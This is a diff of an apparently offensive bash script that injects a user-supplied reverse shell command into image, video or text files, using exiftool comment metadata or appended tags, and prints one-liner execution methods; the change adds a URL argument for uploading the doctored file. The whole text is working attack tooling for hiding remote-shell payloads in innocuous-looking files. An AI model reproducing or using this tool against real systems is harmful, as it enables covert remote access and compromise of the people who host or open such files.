@@ -24,8 +24,8 @@
 #-------------------------------------------------
 
 show_help() {
-    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename>"
-    echo "Inject a reverse shell command into an image and generate a one-liner execution method."
+    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename> <URL>"
+    echo "Inject a reverse shell command into an image, generate a one-liner execution method, and upload the file."
     echo ""
     echo "Options:"
     echo "  -h, --help           Display this help message."
@@ -33,6 +33,7 @@ show_help() {
     echo "Arguments:"
     echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
     echo "  <filename>            The name of the file."
+    echo "  <URL>                 The URL path to upload the file (e.g., http://www.example.com)."
     echo ""
 }
 
@@ -41,7 +42,7 @@ if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
     exit 0
 fi
 
-if [ $# -ne 2 ]; then
+if [ $# -ne 3 ]; then
     echo "Error: Invalid number of arguments."
     show_help
     exit 1
@@ -49,19 +50,18 @@ fi
 
 command="$1"
 filename="$2"
+url="$3"
 
 # For text files
-if [[ "$method_choice" == "11" ]]; then
+if [[ "$filename" == *.txt || "$filename" == *.html || "$filename" == *.htm ]]; then
     echo -e "\e[34mInjecting reverse shell into text file..."
-    echo "<rs>$command</rs>" >> "$filename"
+    echo "'<rs>$command</rs>'" >> "$filename"
     echo "Text based file command injection method completed."
 fi
 
 exiftool -Comment="$command" "$filename"
 
 echo "Image/Video file command injection method completed."
-
-read -p "Enter the URL path to the file (e.g., http://www.example.com): " url
 
 echo "Execution methods compatible with image file format:"
 echo "1. image-exiftool-one-liner"
